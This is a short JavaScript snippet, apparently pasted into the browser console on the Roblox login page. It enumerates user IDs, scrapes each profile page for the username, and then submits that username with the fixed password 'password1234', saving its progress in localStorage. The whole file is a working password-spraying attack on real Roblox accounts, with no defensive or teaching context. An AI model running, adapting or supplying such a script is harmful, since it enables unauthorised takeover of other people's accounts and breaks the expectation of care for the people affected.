function wait(ms){
    const promise = new Promise((reslove)=>{setTimeout(() => {
        reslove()
    }, ms);})
    
    return promise
}

async function main(){
    const start = localStorage.getItem('int') | '1003' 
    let i = parseInt(start)
    const loginInput = document.querySelector('#login-username')
    const passwordInput = document.querySelector('#login-password')
    const loginButton = document.querySelector('#login-button')
    async function goThough(){
        const url = `https://www.roblox.com/users/${i}/profile`
        let responce = null

        try {
            responce = await fetch(url)
        } catch (error) {
            console.error(error)
            await wait(500)
            i += 1
            goThough()
            return
        }

        const htmlString = await responce.text()

        const parser = new DOMParser()
        const htmlObject = parser.parseFromString(htmlString, 'text/html')

        let username = htmlObject.querySelector('.profile-name:not(.font-header-1)')?.textContent.replace(/[\n\s]/g, '')
        if(!username){
            await wait(500)
            i += 1
            goThough()
            return
        }
        document.querySelector('#login-username').value = username
        console.warn(loginInput.value)
        passwordInput.value = 'password1234'
        loginButton.click()
        console.log(url)
        i+=1
        localStorage.setItem('int',i)
    }

    passwordInput.value = 'password1234'

    setTimeout(goThough,10*1000)
}

main()